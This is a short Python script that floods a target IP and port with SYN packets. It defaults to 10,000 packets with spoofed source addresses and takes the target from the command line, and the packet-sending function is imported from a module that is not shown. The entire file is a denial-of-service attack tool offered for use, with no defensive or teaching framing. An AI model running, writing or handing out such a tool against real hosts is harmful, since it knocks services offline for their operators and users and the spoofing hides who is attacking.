import sys

from single import send_syn, _bool_val


def flood(target_ip, target_port, spoof_ip=False, count=10000):
    """Flood the target with [count] syn packets"""
    if count == 1:
        print("Sending single syn packet to %s:%s" % (target_ip, target_port))
    else:
        print("Flooding with %d syn packets %s:%s" % (count, target_ip, target_port))
    for i in range(count):
        send_syn(target_ip, target_port, spoof_ip)
    print("Done. Sent %d syn packets" % count)


def _help(argv):
    print("Usage  : python %s target_ip target_port [count:int] [spoof_ip:bool]\n"
          "Example: python %s 192.168.1.25 8080 1000 true" % (argv[0], argv[0]))
    exit(1)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        _help(sys.argv)
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    count = 10000
    spoof_ip = True
    if len(sys.argv) > 3:
        try:
            count = int(sys.argv[3])
        except:
            _help(sys.argv)
    if len(sys.argv) > 4:
        val = sys.argv[4].lower()
        try:
            spoof_ip = _bool_val(val)
        except:
            if val == "spoof_ip":
                spoof_ip = True
            else:
                _help(sys.argv)
    flood(target_ip, target_port, spoof_ip=spoof_ip, count=count)
